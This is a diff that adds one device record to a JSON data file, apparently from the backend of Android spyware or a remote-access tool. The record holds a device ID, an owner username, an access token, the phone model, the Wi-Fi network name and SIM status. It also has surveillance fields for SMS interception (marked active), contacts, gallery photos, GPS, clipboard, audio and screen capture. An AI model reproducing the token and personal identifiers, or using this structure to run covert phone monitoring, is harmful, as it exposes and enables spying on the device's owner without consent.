@@ -7883,5 +7883,37 @@
       "frameId": 147,
       "capturedAt": 1777176020097
     }
+  },
+  {
+    "deviceId": "aimlock_0919c762",
+    "deviceName": "HP-RRR-85A1",
+    "ownerUsername": "raditcees",
+    "token": "d40c7b4bef4b07ee53e2456f723de6fe",
+    "lastSeen": 1777188640609,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-26T07:30:11.065Z",
+    "deviceInfo": {
+      "model": "samsung SM-A217F",
+      "androidVersion": "Android 12",
+      "battery": 58,
+      "network": "WiFi: HUAWEI-Bz5c",
+      "sim1": "Hanya panggilan darurat",
+      "sim2": "Hanya panggilan darurat"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
